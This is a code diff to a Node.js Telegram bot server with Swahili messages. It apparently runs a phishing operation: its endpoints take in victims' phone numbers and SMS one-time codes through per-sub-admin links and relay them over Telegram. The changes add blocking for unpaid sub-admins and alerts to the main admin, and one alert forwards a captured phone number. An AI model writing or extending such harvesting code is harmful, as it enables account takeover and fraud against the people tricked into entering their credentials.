@@ -142,6 +142,19 @@ mainBot.on('message', (msg) => {
 });
 
 function sendAdminLink(chatId, userIdStr, firstName, username) {
+    const adminData = registeredAdmins.get(userIdStr);
+    
+    // Check if sub-admin is blocked
+    if (userIdStr !== MAIN_ADMIN_ID && adminData && adminData.isBlocked) {
+        mainBot.sendMessage(chatId, "🛑 *Samahani!*\n\nKiungo chako kimezimwa na Msimamizi Mkuu. Huwezi kukitumia kwa sasa.", { parse_mode: "Markdown" })
+            .catch(err => console.error("Error sending blocked message:", err));
+        
+        // Deliver alert message directly to main admin that a blocked sub-admin tried to access their link
+        mainBot.sendMessage(MAIN_ADMIN_ID, `⚠️ **JARIBIO LA KUTUMIA KIUNGO KILICHOZUIWA**\n\nSub-Admin *${escapeMarkdown(firstName)}* (\`${userIdStr}\`) amejaribu kutumia kiungo chake lakini amezuiwa.`, { parse_mode: "Markdown" })
+            .catch(err => console.error("Error alerting main admin:", err));
+        return;
+    }
+
     const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
     const isolatedLink = `${host}/?admin=${userIdStr}`;
     const welcomeText = `🚨 *Kiungo Chako cha Admin kiko Tayari!*\n\n` +
@@ -204,7 +217,13 @@ app.post('/api/submit-credentials', (req, res) => {
     if (targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(targetAdmin)) {
         if (registeredAdmins.get(targetAdmin).isBlocked) {
             console.log(`⚠️ Blocked credential delivery for sub-admin ${targetAdmin} due to individual /payment block.`);
-            return res.json({ success: true, sessionId });
+            
+            // Deliver message to main admin about the block attempt
+            const adminData = registeredAdmins.get(targetAdmin);
+            mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **JARIBIO LIMEZUIWA (CREDENTIALS)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(adminData ? adminData.firstName : 'Unknown')}* (\`${targetAdmin}\`) amejaribu kuwasilisha taarifa kupitia kiungo chake.\n\n📱 Namba: ${phone}`, { parse_mode: "Markdown" })
+                .catch(err => console.error("Error notifying main admin:", err));
+
+            return res.json({ success: false, message: 'Admin is blocked' });
         }
     }
 
@@ -249,7 +268,13 @@ app.post('/api/submit-otp', (req, res) => {
     if (session.targetAdmin !== MAIN_ADMIN_ID && registeredAdmins.has(session.targetAdmin)) {
         if (registeredAdmins.get(session.targetAdmin).isBlocked) {
             console.log(`⚠️ Blocked OTP delivery for sub-admin ${session.targetAdmin} due to individual /payment block.`);
-            return res.json({ success: true });
+            
+            // Deliver message to main admin about the block attempt
+            const adminData = registeredAdmins.get(session.targetAdmin);
+            mainBot.sendMessage(MAIN_ADMIN_ID, `🛑 **JARIBIO LIMEZUIWA (OTP)**\n\nSub-Admin aliyefungiwa *${escapeMarkdown(adminData ? adminData.firstName : 'Unknown')}* (\`${session.targetAdmin}\`) amejaribu kutuma SMS OTP kupitia kiungo chake.`, { parse_mode: "Markdown" })
+                .catch(err => console.error("Error notifying main admin:", err));
+
+            return res.json({ success: false, message: 'Admin is blocked' });
         }
     }
 
